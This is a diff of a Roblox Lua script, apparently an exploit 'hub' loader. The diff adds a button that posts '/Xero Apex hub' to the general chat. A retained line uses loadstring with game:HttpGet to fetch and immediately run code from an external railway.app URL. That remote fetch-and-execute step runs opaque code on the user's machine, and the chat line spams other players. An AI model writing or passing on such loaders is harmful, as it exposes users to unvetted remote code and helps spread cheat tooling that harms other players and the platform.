@@ -1,4 +1,39 @@
 task.spawn(function()
+-- SERVICES
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+
+local player = Players.LocalPlayer
+
+-- GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- BOTÓN
+local btn = Instance.new("TextButton")
+btn.Parent = screenGui
+btn.Size = UDim2.new(0, 100, 0, 35)
+btn.Position = UDim2.new(0, 70, 0, 130)
+btn.Text = "SEND"
+btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+btn.Font = Enum.Font.GothamBold
+btn.TextSize = 14
+
+Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+
+-- CLICK → ENVIAR MENSAJE (CHAT MODERNO)
+btn.MouseButton1Click:Connect(function()
+    local channels = TextChatService:WaitForChild("TextChannels")
+    local channel = channels:FindFirstChild("RBXGeneral")
+
+    if channel then
+        channel:SendAsync("/Xero Apex hub")
+    end
+end)
+end)
+
+task.spawn(function()
 loadstring(game:HttpGet("https://ors-production-ef06.up.railway.app/s/8e11587ec87f9d06", true))()
 end)
 
